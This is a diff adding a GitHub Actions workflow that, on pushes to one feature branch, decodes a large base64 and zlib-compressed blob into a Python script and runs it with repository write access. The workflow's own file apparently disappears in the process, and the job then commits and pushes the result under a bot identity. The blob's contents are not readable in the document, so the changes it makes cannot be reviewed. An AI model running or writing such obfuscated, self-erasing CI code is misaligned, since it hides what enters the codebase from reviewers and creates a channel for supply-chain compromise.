@@ -1,0 +1,81 @@
+name: temporary-session-http-integration
+
+on:
+  push:
+    branches:
+      - feat/plan-v3-gap-closure-2026-08-29
+
+permissions:
+  contents: write
+
+concurrency:
+  group: temporary-session-http-integration
+  cancel-in-progress: false
+
+jobs:
+  implement-verify-and-push:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 75
+    steps:
+      - name: Fetch exact branch without external actions
+        env:
+          GH_TOKEN: ${{ github.token }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf "$GITHUB_WORKSPACE"
+          git init "$GITHUB_WORKSPACE"
+          git -C "$GITHUB_WORKSPACE" remote add origin \
+            "https://x-access-token:${GH_TOKEN}@github.com/${GITHUB_REPOSITORY}.git"
+          git -C "$GITHUB_WORKSPACE" fetch --no-tags --depth=1 origin "$GITHUB_SHA"
+          git -C "$GITHUB_WORKSPACE" checkout -B "$GITHUB_REF_NAME" FETCH_HEAD
+          test "$(git -C "$GITHUB_WORKSPACE" rev-parse HEAD)" = "$GITHUB_SHA"
+          git -C "$GITHUB_WORKSPACE" show -s --format='commit=%H%ntree=%T'
+
+      - name: Apply session HTTP integration and self-remove
+        shell: bash
+        run: |
+          set -euo pipefail
+          python3 - <<'PY'
+          import base64
+          import zlib
+          from pathlib import Path
+
+          payload = """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"""
+          script = zlib.decompress(base64.b64decode(payload))
+          Path("/tmp/apply-session-http.py").write_bytes(script)
+          PY
+          python3 -m py_compile /tmp/apply-session-http.py
+          python3 /tmp/apply-session-http.py
+          test ! -e .github/workflows/temporary-session-http-integration.yml
+          git diff --check
+
+      - name: Validate Rust and control-plane corpus
+        shell: bash
+        run: |
+          set -euo pipefail
+          rustup toolchain install 1.85.1 --profile minimal --component rustfmt,clippy
+          rustup override set 1.85.1
+          cargo fmt --all
+          git diff --check
+          cargo fmt --all -- --check
+          cargo test --workspace --all-targets --locked
+          cargo clippy --workspace --all-targets --locked -- -D warnings
+          python3 scripts/check-trnm-server.py
+          python3 scripts/check-plan.py
+          python3 scripts/check-workflow-action-policy.py
+          python3 scripts/check-denominator-materialization.py --require-present --require-review-ready
+          python3 -m unittest discover -s tests -p 'test_*.py' -v
+
+      - name: Commit validated session HTTP source candidate
+        shell: bash
+        run: |
+          set -euo pipefail
+          test ! -e .github/workflows/temporary-session-http-integration.yml
+          git diff --check
+          git config user.name "trillionnium-gap-closure-bot"
+          git config user.email "gap-closure-bot@users.noreply.github.com"
+          git add -A
+          test -n "$(git diff --cached --name-only)"
+          git commit -m "feat(session): integrate access refresh and logout HTTP"
+          git push origin "HEAD:${GITHUB_REF_NAME}"
